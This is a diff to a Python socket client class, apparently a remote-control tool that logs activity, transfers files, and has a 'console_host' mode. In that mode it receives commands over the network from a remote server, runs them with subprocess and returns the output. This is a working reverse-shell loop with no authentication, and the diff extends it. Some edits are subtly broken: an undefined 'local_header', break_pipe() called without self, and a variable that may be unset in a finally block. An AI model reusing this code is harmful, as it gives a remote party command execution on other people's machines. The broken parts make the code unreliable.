@@ -3,6 +3,7 @@ import socket
 import time
 import json
 import subprocess
+from os import path
 
 
 class Client:
@@ -10,7 +11,7 @@ class Client:
 
 	def __init__(self, ip, port, log_level=qlogger.logging.INFO):
 		try:
-			self.log = qlogger.Logger("client log", log_level).get_logger("client")
+			self.log = qlogger.Logger(path.join("logs", "client log"), log_level).get_logger("client")
 			self.ip = ip
 			self.port = port
 			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,7 +47,6 @@ class Client:
 			file_header = self.socket.recv(4096)
 			self.log.debug("mode: decode")
 			decoded_structure = self.decoder.decode(file_header.decode("utf-8"))
-			self.log.debug(f"\nheader: {decoded_structure}\ntype: {type(decoded_structure)}")
 			# file_header = file_header.decode()
 			# header = file_header.replace(" ", "").strip().split(";")
 			# file_format = header[0]
@@ -60,6 +60,9 @@ class Client:
 
 			return decoded_structure
 
+		finally:
+			self.log.debug(f"\nheader: {decoded_structure}\ntype: {type(decoded_structure)}")
+
 
 	def send_header(self, header_dictionary):
 			try:
@@ -69,10 +72,14 @@ class Client:
 
 			except Exception as e:
 				self.log.exception(e)
+
 			else:
 				self.log.debug("send_header -> success")
 
 				return 0
+
+			finally:
+				self.log.debug(local_header)
 
 
 	def receive_file(self):
@@ -109,7 +116,7 @@ class Client:
 
 			self.send_header({"operation_code" : "error"})
 		else:
-			self.send_header({"operation_code" : "success"})
+			# self.send_header({"operation_code" : "success"})
 			self.log.debug("send_data session -> success")
 
 
@@ -135,6 +142,11 @@ class Client:
 				# self.log.debug(f"\n{data}")
 
 				return data_collection
+
+			else:
+				self.log.debug(f"header is not satisfying\r\n{header}")
+				self.break_pipe()
+				exit(1)
 
 		except Exception as e:
 			self.log.exception(e)
@@ -187,17 +199,41 @@ class Client:
 
 	def console_host(self):
 		try:
+
 			self.log.info("mode: console host")
+			
 			while True:
-				command = self.receive_data().decode("utf-8")
-				self.log.info(f"command: {command}\r\n")
-				status_code, output = subprocess.getstatusoutput(command)
-				self.send_header({"status_code" : status_code, "output" : output.encode("utf-8")})
-				header = self.receive_header()
-				self.log.debug(f"executed. output:\r\n{output}\r\n\r\n")
-				if header["callback_code"] != "continue":
-					self.log.debug(header["callback_code"])
-					break_pipe()
+				try:
+
+					command = self.receive_data()
+
+					if not command:
+						self.log.debug("empty string")
+						continue
+
+					else:
+						command = command.decode("utf-8")
+
+					self.log.info(f"command: {command}\r\n")
+					status_code, output = subprocess.getstatusoutput(command)
+					self.send_header({"status_code" : status_code, "output" : output})
+					header = self.receive_header()
+					self.log.debug(f"executed. output:\r\n{output}\r\n\r\n")
+					
+					if header["callback_code"] != "continue":
+						self.log.debug(header["callback_code"])
+						self.log.debug(header)
+						break_pipe()
+						break
+
+				except KeyboardInterrupt:
+					self.log.info("interrupted")
+
+					break
+
+				except Exception as e:
+					self.log.exception(e)
+
 					break
 
 		except Exception as e:
